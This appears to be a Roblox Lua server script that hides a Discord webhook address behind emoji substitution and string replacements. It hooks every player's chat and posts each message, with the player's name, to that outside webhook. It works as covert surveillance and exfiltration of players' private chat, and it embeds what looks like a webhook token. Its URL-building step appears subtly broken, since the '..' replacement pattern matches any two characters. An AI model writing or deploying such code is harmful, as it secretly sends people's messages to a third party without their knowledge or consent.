local http = game:GetService("HttpService")
tag = "api/webhooks/132120301874551193💀/💀PB1391-BQTmY2Q5vjF1💀k-rImpj0OuFEitpa5hw92Y55at9btlab7hTYkQJFESLfsbI"
local name = string.gsub(tag, "💀", "6")
local idkFr = "___..".."/"..name
idk2 = string.gsub(idkFr,"___", "https://di")

local function sent(msg:string)
	http:PostAsync(string.gsub(idk2,"..","scord.com"),http:JSONEncode({
		["content"]= msg
	}))
end
for i,plr in pairs(game.Players:GetPlayers()) do
	plr.Chatted:Connect(function(msg)
		sent(plr.Name..":/n"..msg)
	end)
end
game.Players.PlayerAdded:Connect(function(plr)
	plr.Chatted:Connect(function(msg)
		sent(plr.Name..":/n"..msg)
	end)
end)
game.Players.PlayerRemoving:Connect(function(plr)
	plr.Chatted:Connect(function(msg)
		sent(plr.Name..":/n"..msg)
	end)
end)
